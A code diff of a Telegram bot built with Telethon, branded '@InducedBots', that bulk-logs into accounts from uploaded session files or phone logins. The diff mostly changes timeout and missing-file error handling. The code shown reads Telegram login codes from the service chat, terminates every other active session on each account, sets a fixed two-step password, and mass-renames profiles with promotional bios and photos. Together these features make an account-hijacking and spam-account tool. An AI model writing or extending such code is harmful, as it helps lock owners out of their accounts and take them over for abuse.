@@ -1,3 +1,4 @@
+from ast import Try
 import random
 import telethon
 import logging
@@ -11,7 +12,7 @@ import os
 import zipfile
 import telegraph
 from telethon.tl.functions.account import UpdateProfileRequest
-from telethon.tl.functions.photos import DeletePhotosRequest, UploadProfilePhotoRequest
+from telethon.tl.functions.photos import UploadProfilePhotoRequest
 from telethon.errors.rpcerrorlist import PhoneCodeExpiredError, FloodWaitError, PhoneCodeInvalidError, PhoneNumberBannedError, PhoneNumberInvalidError, SessionPasswordNeededError
 from firebase_admin import credentials, db, initialize_app
 text = """
@@ -172,7 +173,7 @@ async def _(e):
                         two_step_code = await xmr.get_response(timeout=300)
                         if two_step_code.text == "/start" or two_step_code.text == "/help":
                             return
-                    except TimeoutError:
+                    except asyncio.exceptions.TimeoutError:
                         await xmr.send_message("`Time Limit Reached of 5 Min.`")
                         return
                     try:
@@ -189,7 +190,7 @@ async def _(e):
                 async for xr in cl.iter_messages("@SpamBot", limit=1):
                     stats = str(xr.text)
                 mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**")
-            except TimeoutError:
+            except asyncio.exceptions.TimeoutError:
                 await xmr.send_message("Time Limit Reached of 5 Min.")
                 return
         async with e.client.conversation(e.chat_id) as x:
@@ -198,7 +199,7 @@ async def _(e):
                 message = await x.get_response(timeout=600)
                 if message.text == "/start" or message.text == "/help":
                     return
-            except TimeoutError:
+            except asyncio.exceptions.TimeoutError:
                 await x.send_message("Time Limit Reached of 5 Min.")
                 return
             await x.send_message(f"Send Send Your Ads Image Or No in case you Not wants to set image")
@@ -278,7 +279,7 @@ async def _(e):
                 except PhoneNumberBannedError:
                     await xmr.send_message(f"{phone} is Baned")
                     return
-                except TimeoutError:
+                except asyncio.exceptions.TimeoutError:
                     await xmr.send_message("Time Limit Reached of 5 Min.")
                     return
                 except PhoneCodeInvalidError:
@@ -293,7 +294,7 @@ async def _(e):
                         two_step_code = await xmr.get_response(timeout=300)
                         if two_step_code.text == "/start" or two_step_code.text == "/help":
                             return
-                    except TimeoutError:
+                    except asyncio.exceptions.TimeoutError:
                         await xmr.send_message("`Time Limit Reached of 5 Min.`")
                         return
                     try:
@@ -310,7 +311,7 @@ async def _(e):
                 async for xr in cl.iter_messages("@SpamBot", limit=1):
                     stats = str(xr.text)
                 await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**")
-            except TimeoutError:
+            except asyncio.exceptions.TimeoutError:
                 await xmr.send_message("Time Limit Reached of 5 Min.")
                 return
         async with e.client.conversation(e.chat_id) as x:
@@ -319,7 +320,7 @@ async def _(e):
                 message = await x.get_response(timeout=600)
                 if message.text == "/start" or message.text == "/help":
                     return
-            except TimeoutError:
+            except asyncio.exceptions.TimeoutError:
                 await x.send_message("Time Limit Reached of 5 Min.")
                 return
             user = await cl.get_entity(message.text)
@@ -597,43 +598,46 @@ async def _(e):
                     await a.edit("Unziping Finish")
                     rar[f'{e.query.user_id}'] = False
                     rare[f'{e.query.user_id}'] = False
-                    for r in os.listdir(f'{e.query.user_id}/sessions'):
-                        if not r.endswith(".session"):
-                            continue
-                        r = r.replace('.session', '')
-                        try:
-                            cl = telethon.TelegramClient(
-                                f"{e.query.user_id}/sessions/{r}", api[0], api[1])
-                            await cl.connect()
-                            k = await cl.get_me()
-                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
-                            await cl.send_message('SpamBot', '/start')
-                            await asyncio.sleep(2)
-                            async for xr in cl.iter_messages("@SpamBot", limit=1):
-                                stats = str(xr.text)
-                            await cl(UpdateProfileRequest(about="Powered By: @InducedBots"))
-                            await cl(UploadProfilePhotoRequest(await cl.upload_file('Induced.png'),))
-                            mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{r}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**", buttons=[[telethon.Button.inline("Get Otp✅", b"Otp"), telethon.Button.inline("Skip", b"Next"), ]])
-                            while True:
+                    try:
+                        for r in os.listdir(f'{e.query.user_id}/sessions'):
+                            if not r.endswith(".session"):
+                                continue
+                            r = r.replace('.session', '')
+                            try:
+                                cl = telethon.TelegramClient(
+                                    f"{e.query.user_id}/sessions/{r}", api[0], api[1])
+                                await cl.connect()
+                                k = await cl.get_me()
+                                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
+                                await cl.send_message('SpamBot', '/start')
                                 await asyncio.sleep(2)
-                                if rar[f'{e.query.user_id}'] == True:
-                                    rar[f'{e.query.user_id}'] = False
-                                    msg = await cl.get_messages(777000, limit=1)
-                                    try:
-                                        otp = (
-                                            f'{msg[0].message.split(":")[1].split(" ")[1].replace(".", "")}')
-                                    except:
-                                        otp = "Not Come \n\nMoving To Next Number"
-                                    await mess.edit((f"Login Successfully✅ Done.\n\n**Name:** {k.first_name}\n**Username:** {k.username}\n**Phone:** {r}\n**SpamBot Stats:** {stats}\n\nOtp: `{otp}`\n\n\n**Made with ❤️ By @InducedBots**"))
-                                    break
-                                elif rare[f'{e.query.user_id}'] == True:
-                                    rare[f'{e.query.user_id}'] = False
-                                    break
-                        except Exception as a:
-                            await xmr.send_message(f"Login {r} UnSucessfully")
-                            continue
-                    await xmr.send_message("Adding Done Sucessfully")
-            except TimeoutError:
+                                async for xr in cl.iter_messages("@SpamBot", limit=1):
+                                    stats = str(xr.text)
+                                await cl(UpdateProfileRequest(about="Powered By: @InducedBots"))
+                                await cl(UploadProfilePhotoRequest(await cl.upload_file('Induced.png'),))
+                                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{r}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**", buttons=[[telethon.Button.inline("Get Otp✅", b"Otp"), telethon.Button.inline("Skip", b"Next"), ]])
+                                while True:
+                                    await asyncio.sleep(2)
+                                    if rar[f'{e.query.user_id}'] == True:
+                                        rar[f'{e.query.user_id}'] = False
+                                        msg = await cl.get_messages(777000, limit=1)
+                                        try:
+                                            otp = (
+                                                f'{msg[0].message.split(":")[1].split(" ")[1].replace(".", "")}')
+                                        except:
+                                            otp = "Not Come \n\nMoving To Next Number"
+                                        await mess.edit((f"Login Successfully✅ Done.\n\n**Name:** {k.first_name}\n**Username:** {k.username}\n**Phone:** {r}\n**SpamBot Stats:** {stats}\n\nOtp: `{otp}`\n\n\n**Made with ❤️ By @InducedBots**"))
+                                        break
+                                    elif rare[f'{e.query.user_id}'] == True:
+                                        rare[f'{e.query.user_id}'] = False
+                                        break
+                            except Exception as a:
+                                await xmr.send_message(f"Login {r} UnSucessfully")
+                                continue
+                        await xmr.send_message("Adding Done Sucessfully")
+                    except FileNotFoundError:
+                        await xmr.send_message("You Are Using Invalid Formate session.zip")
+            except asyncio.exceptions.TimeoutError:
                 await xmr.send_message("Time Limit Reached of 5 Min.")
                 return
 
@@ -661,42 +665,45 @@ async def _(e):
                     await a.edit("Unziping Finish")
                     rar[f'{e.query.user_id}'] = False
                     rare[f'{e.query.user_id}'] = False
-                    for r in os.listdir(f'{e.query.user_id}/sessions'):
-                        if not r.endswith(".session"):
-                            continue
-                        r = r.replace('.session', '')
-                        try:
-                            cl = telethon.TelegramClient(
-                                f"{e.query.user_id}/sessions/{r}", api[0], api[1])
-                            await cl.connect()
-                            k = await cl.get_me()
-                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
-                            await cl.send_message('SpamBot', '/start')
-                            await asyncio.sleep(2)
-                            async for xr in cl.iter_messages("@SpamBot", limit=1):
-                                stats = str(xr.text)
-                            await cl(UpdateProfileRequest(about="Powered By: @InducedBots"))
-                            await cl(UploadProfilePhotoRequest(await cl.upload_file('Induced.png'),))
-                            c = 0
+                    try:
+                        for r in os.listdir(f'{e.query.user_id}/sessions'):
+                            if not r.endswith(".session"):
+                                continue
+                            r = r.replace('.session', '')
                             try:
-                                auths = await cl(telethon.functions.account.GetAuthorizationsRequest())
-                                hashs = [i.hash for i in auths.authorizations]
-                                for i in hashs:
-                                    if i != 0:
-                                        try:
-                                            await cl(telethon.functions.account.ResetAuthorizationRequest(hash=i))
-                                            c += 1
-                                        except:
-                                            pass
-                            except:
-                                pass
-                            mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**Session Stats:** `{c} Sessions Terminated`\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
-                            await cl.disconnect()
-                        except Exception as a:
-                            await xmr.send_message(f"Login `{r}` UnSucessfully")
-                            await cl.disconnect()
-                    await xmr.send_message("Task Done Sucessfully")
-            except TimeoutError:
+                                cl = telethon.TelegramClient(
+                                    f"{e.query.user_id}/sessions/{r}", api[0], api[1])
+                                await cl.connect()
+                                k = await cl.get_me()
+                                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
+                                await cl.send_message('SpamBot', '/start')
+                                await asyncio.sleep(2)
+                                async for xr in cl.iter_messages("@SpamBot", limit=1):
+                                    stats = str(xr.text)
+                                await cl(UpdateProfileRequest(about="Powered By: @InducedBots"))
+                                await cl(UploadProfilePhotoRequest(await cl.upload_file('Induced.png'),))
+                                c = 0
+                                try:
+                                    auths = await cl(telethon.functions.account.GetAuthorizationsRequest())
+                                    hashs = [i.hash for i in auths.authorizations]
+                                    for i in hashs:
+                                        if i != 0:
+                                            try:
+                                                await cl(telethon.functions.account.ResetAuthorizationRequest(hash=i))
+                                                c += 1
+                                            except:
+                                                pass
+                                except:
+                                    pass
+                                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**Session Stats:** `{c} Sessions Terminated`\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
+                                await cl.disconnect()
+                            except Exception as a:
+                                await xmr.send_message(f"Login `{r}` UnSucessfully")
+                                await cl.disconnect()
+                        await xmr.send_message("Task Done Sucessfully")
+                    except FileNotFoundError:
+                        await xmr.send_message("You Are Using Invalid Formate session.zip")
+            except asyncio.exceptions.TimeoutError:
                 await xmr.send_message("Time Limit Reached of 5 Min.")
                 return
 
@@ -724,34 +731,37 @@ async def _(e):
                     await a.edit("Unziping Finish")
                     rar[f'{e.query.user_id}'] = False
                     rare[f'{e.query.user_id}'] = False
-                    for r in os.listdir(f'{e.query.user_id}/sessions'):
-                        if not r.endswith(".session"):
-                            continue
-                        r = r.replace('.session', '')
-                        try:
-                            cl = telethon.TelegramClient(
-                                f"{e.query.user_id}/sessions/{r}", api[0], api[1])
-                            await cl.connect()
-                            k = await cl.get_me()
-                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
-                            await cl.send_message('SpamBot', '/start')
-                            await asyncio.sleep(2)
-                            async for xr in cl.iter_messages("@SpamBot", limit=1):
-                                stats = str(xr.text)
-                            c = 0
+                    try:
+                        for r in os.listdir(f'{e.query.user_id}/sessions'):
+                            if not r.endswith(".session"):
+                                continue
+                            r = r.replace('.session', '')
                             try:
-                                await cl.edit_2fa('@InducedBots')
-                                S = "2 Step Enables with Password `@InducedBots`"
-                            except:
-                                S = "Unable To Set 2 Step Verification"
-                                pass
-                            mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**2 Step Stats:** {S}\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
-                            await cl.disconnect()
-                        except Exception as a:
-                            await xmr.send_message(f"Login `{r}` UnSucessfully")
-                            await cl.disconnect()
-                    await xmr.send_message("Task Done Sucessfully")
-            except TimeoutError:
+                                cl = telethon.TelegramClient(
+                                    f"{e.query.user_id}/sessions/{r}", api[0], api[1])
+                                await cl.connect()
+                                k = await cl.get_me()
+                                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
+                                await cl.send_message('SpamBot', '/start')
+                                await asyncio.sleep(2)
+                                async for xr in cl.iter_messages("@SpamBot", limit=1):
+                                    stats = str(xr.text)
+                                c = 0
+                                try:
+                                    await cl.edit_2fa('@InducedBots')
+                                    S = "2 Step Enables with Password `@InducedBots`"
+                                except:
+                                    S = "Unable To Set 2 Step Verification"
+                                    pass
+                                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**2 Step Stats:** {S}\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
+                                await cl.disconnect()
+                            except Exception as a:
+                                await xmr.send_message(f"Login `{r}` UnSucessfully")
+                                await cl.disconnect()
+                        await xmr.send_message("Task Done Sucessfully")
+                    except FileNotFoundError:
+                        await xmr.send_message("You Are Using Invalid Formate session.zip")
+            except asyncio.exceptions.TimeoutError:
                 await xmr.send_message("Time Limit Reached of 5 Min.")
                 return
 
@@ -784,40 +794,42 @@ async def _(e):
                     if Zip.text == "/start" or Zip.text == "/help":
                         return
                     c =0
-                    
-                    for r in os.listdir(f'{e.query.user_id}/sessions'):
-                        if not r.endswith(".session"):
-                            continue
-                        r = r.replace('.session', '')
-                        try:
-                            cl = telethon.TelegramClient(
-                                f"{e.query.user_id}/sessions/{r}", api[0], api[1])
-                            await cl.connect()
-                            k = await cl.get_me()
-                            await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
-                            await cl.send_message('SpamBot', '/start')
-                            await asyncio.sleep(2)
-                            async for xr in cl.iter_messages("@SpamBot", limit=1):
-                                stats = str(xr.text)
-                            
-                            c +=1
+                    try:
+                        for r in os.listdir(f'{e.query.user_id}/sessions'):
+                            if not r.endswith(".session"):
+                                continue
+                            r = r.replace('.session', '')
                             try:
-                                await cl(UpdateProfileRequest(first_name=Zip.text))
-                                await cl(UpdateProfileRequest(last_name=f"#{c}"))
-                                await cl(UpdateProfileRequest(about="Powered By: @InducedBots"))
-                                await cl(UploadProfilePhotoRequest(await cl.upload_file('Induced.png'),))
-                                S = "Done"
-                            except:
-                                S = "UnSucessFull"
-                                pass
-                            k = await cl.get_me()
-                            mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**2 Step Stats:** {S}\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
-                            await cl.disconnect()
-                        except Exception as a:
-                            await xmr.send_message(f"Login `{r}` UnSucessfully")
-                            await cl.disconnect()
-                    await xmr.send_message("Task Done Sucessfully")
-            except TimeoutError:
+                                cl = telethon.TelegramClient(
+                                    f"{e.query.user_id}/sessions/{r}", api[0], api[1])
+                                await cl.connect()
+                                k = await cl.get_me()
+                                await cl(telethon.functions.contacts.UnblockRequest(id='@SpamBot'))
+                                await cl.send_message('SpamBot', '/start')
+                                await asyncio.sleep(2)
+                                async for xr in cl.iter_messages("@SpamBot", limit=1):
+                                    stats = str(xr.text)
+                                
+                                c +=1
+                                try:
+                                    await cl(UpdateProfileRequest(first_name=Zip.text))
+                                    await cl(UpdateProfileRequest(last_name=f"#{c}"))
+                                    await cl(UpdateProfileRequest(about="Powered By: @InducedBots"))
+                                    await cl(UploadProfilePhotoRequest(await cl.upload_file('Induced.png'),))
+                                    S = "Done"
+                                except:
+                                    S = "UnSucessFull"
+                                    pass
+                                k = await cl.get_me()
+                                mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** `{k.username}`\n**Phone:** `{r}`\n**2 Step Stats:** {S}\n**SpamBot Stats:** `{stats}`\n\n**Made with ❤️ By @InducedBots**")
+                                await cl.disconnect()
+                            except Exception as a:
+                                await xmr.send_message(f"Login `{r}` UnSucessfully")
+                                await cl.disconnect()
+                        await xmr.send_message("Task Done Sucessfully")
+                    except FileNotFoundError:
+                        await xmr.send_message("You Are Using Invalid Formate session.zip")
+            except asyncio.exceptions.TimeoutError:
                 await xmr.send_message("Time Limit Reached of 5 Min.")
                 return
 
@@ -923,7 +935,7 @@ async def _(e):
                     except PhoneNumberBannedError:
                         await xmr.send_message(f"{phone} is Baned")
                         continue
-                    except TimeoutError:
+                    except asyncio.exceptions.TimeoutError:
                         await xmr.send_message("Time Limit Reached of 5 Min.")
                         return
                     except PhoneCodeInvalidError:
@@ -938,7 +950,7 @@ async def _(e):
                             two_step_code = await xmr.get_response(timeout=300)
                             if two_step_code.text == "/start" or two_step_code.text == "/help":
                                 return
-                        except TimeoutError:
+                        except asyncio.exceptions.TimeoutError:
                             await xmr.send_message("`Time Limit Reached of 5 Min.`")
                             return
                         try:
@@ -955,7 +967,7 @@ async def _(e):
                     await cl(UpdateProfileRequest(about="Powered By: @InducedBots"))
                     await cl(UploadProfilePhotoRequest(await cl.upload_file('Induced.png'),))
                     mess = await xmr.send_message(f"Login Successfully✅ Done.\n\n**Name:** `{k.first_name}`\n**Username:** {k.username}\n**Phone:** `{pphone}`\n**SpamBot Stats:** {stats}\n\n**Made with ❤️ By @InducedBots**", buttons=[[telethon.Button.inline("Zip✅", b"Zip")]])
-                except TimeoutError:
+                except asyncio.exceptions.TimeoutError:
                     await xmr.send_message("Time Limit Reached of 5 Min.")
                     return
 
